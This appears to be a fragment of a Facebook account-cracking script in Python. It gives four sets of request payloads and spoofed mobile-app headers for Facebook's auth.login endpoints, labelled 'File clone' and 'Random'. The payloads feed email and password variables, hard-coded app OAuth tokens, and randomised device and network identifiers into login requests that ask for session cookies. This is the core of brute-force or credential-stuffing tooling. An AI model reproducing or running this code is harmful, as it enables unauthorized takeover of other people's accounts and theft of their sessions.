

#---------------[B-graph File clone]
data = {
"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": ps,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}

head = {
'User-Agent': ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'X-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}

url1= 'https://b-graph.facebook.com/auth/login'


#--------------------[B-graph Random]
data={
'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': uid,
'password': ps,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'en_GB',
'client_country_code': 'GB',
'fb_api_req_friendly_name': 'authenticate'}

head={
'User-Agent': ua_string,
'Accept-Encoding':  'gzip, deflate',
'Accept': '*/*',
'Connection': 'keep-alive',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Friendly-Name': 'authenticate',
'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'unknown',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}

url1= 'https://b-graph.facebook.com/auth/login'

#--------------[B-api File]
data = {'adid':str(uuid.uuid4()),
'email':uid,
'password':ps,
'cpl':'true',
'credentials_type':'device_based_login_password',
"source": "device_based_login",
'error_detail_type':'button_with_disabled',
'source':'login',
'format':'json',
'generate_session_cookies':'1',
'generate_analytics_claim':'1',
'generate_machine_id':'1',
"locale":"en_US",
"client_country_code":"US",
'device':'',
'device_id':device_id,
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
head = {
'content-type':'application/x-www-form-urlencoded',
'x-fb-sim-hni':str(random.randint(2e4,4e4)),
'x-fb-connection-type':'unknown',
'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'user-agent':'',
'x-fb-net-hni':str(random.randint(2e4,4e4)),
'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
'x-fb-connection-quality':'EXCELLENT',
'x-fb-friendly-name':'authenticate',
'accept-encoding':'gzip, deflate',
'x-fb-http-engine':     'Liger'}

url1= 'https://b-api.facebook.com/method/auth.login'


#--------------[B-api Random]
data={
'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': uid,
'password': ps,
'generate_analytics_claims': '1', 
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false', 
'generate_session_cookies': '1', 
'generate_machine_id': '1', 
'meta_inf_fbmeta': '', 
'currently_logged_in_userid': '0', 
'fb_api_req_friendly_name': 'authenticate'}

head={
'User-Agent': user_agent, 
'Accept-Encoding': 'gzip, deflate', 
'Accept': '*/*', 
'Connection': 'keep-alive', 
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'X-FB-Friendly-Name': 'authenticate', 
'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
'X-FB-Connection-Type': 'unknown',
'Content-Type': 'application/x-www-form-urlencoded',
'X-FB-HTTP-Engine': 'Liger'}

url="https://api.facebook.com/method/auth.login"